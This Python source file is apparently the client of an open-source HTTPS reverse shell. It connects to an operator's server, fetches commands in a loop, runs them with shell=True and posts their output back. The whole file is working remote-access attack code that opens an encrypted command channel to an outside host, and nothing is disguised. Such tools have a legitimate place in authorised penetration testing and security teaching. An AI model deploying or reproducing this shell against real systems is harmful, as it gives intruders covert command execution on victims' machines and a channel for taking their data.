#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-HTTPS-Reverse-Shell

__author__ = "EONRaider @ keybase.io/eonraider"

import getpass
import http.client
import os
import platform
import ssl
import subprocess
from pathlib import Path
from urllib import request, parse


class ClientCommands:
    def __init__(self, client):
        """Dispatch commands received from the server to their respective
        methods, depending on their format.

        :param client: Instance of Client through which commands will be
            received.
        """
        self.client = client

    def _send(self, message: [str, bytes, dict], mode: str = "output") -> None:
        """Wrapper for the client's 'post' method."""
        self.client.post({"output": message})

    def cd(self, dest_dir: [str, list]) -> None:
        """Handles change of working directory in the shell."""

        try:
            dest_dir = "~" if len(dest_dir) == 0 else "".join(dest_dir)
            os.chdir(Path(dest_dir).expanduser())
        except FileNotFoundError as e:
            self._send(f"{e}\n")

    def shell(self, command: str) -> None:
        """Handles all standard shell commands received from the
        server."""

        try:
            cmd = subprocess.run(command, capture_output=True, shell=True)
        except FileNotFoundError as e:
            self._send(f"{e}\n")
        else:
            for result in cmd.stdout, cmd.stderr:
                if len(result) > 0:
                    self._send(result)


class Client:
    def __init__(self,
                 server_address: str,
                 server_port: int,
                 ca_file: [str, Path]):
        """Create a Reverse Shell Client that receives commands from a
        server though HTTPS.

        :param server_address: Hostname or address of the server.
        :param server_port: Port number used by the server.
        :param ca_file: Absolute path to a file containing the
            certificate for the Certificate Authority (CA).
        """

        self.server_url = f"https://{server_address}:{server_port}"
        self.commands = ClientCommands(self)
        self.ssl_context = ssl.create_default_context(
            purpose=ssl.Purpose.SERVER_AUTH,
            cafile=str(ca_file)
        )

    @property
    def _shell_prompt(self) -> str:
        """Returns a string containing shell prompt information in the
        format user@host:/path/to/cwd$"""

        return f"{platform.node()}@{getpass.getuser()}:{str(Path.cwd())}$ "

    def post(self, request_body: dict[str, str]) -> str:
        """Send a POST request to the server.

        :param request_body: A dictionary containing key-value pairs to
            be sent as the body of the POST request.
        :return: A response to the POST request.
        """

        request_body: bytes = parse.urlencode(request_body).encode()
        url = request.Request(self.server_url, data=request_body)
        return (request
                .urlopen(url=url, context=self.ssl_context)
                .read()
                .decode())

    def execute(self) -> None:
        while True:
            try:
                response: str = self.post({"prompt": self._shell_prompt})
            except (http.client.RemoteDisconnected, KeyboardInterrupt):
                break
            cmd, *args = response.split(" ")
            try:
                if len(cmd) == 0:    # cmd is an empty string
                    continue
                else:                # cmd is a method of ClientCommands
                    getattr(self.commands, cmd)(args)
            except AttributeError:   # cmd is a standard shell command
                self.commands.shell(response)


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="HTTPS Reverse Shell Client")
    parser.add_argument("host",
                        type=str,
                        metavar="<hostname/address>",
                        help="Address or hostname of the server to connect to.")
    parser.add_argument("-p", "--port",
                        type=int,
                        required=True,
                        metavar="<port>",
                        help="Port number exposed by the server.")
    parser.add_argument("--ca-cert",
                        type=str,
                        metavar="<path>",
                        help="Absolute path to a file containing the "
                             "certificate for the Certificate Authority (CA).")

    _args = parser.parse_args()

    Client(
        server_address=_args.host,
        server_port=_args.port,
        ca_file=_args.ca_cert
    ).execute()
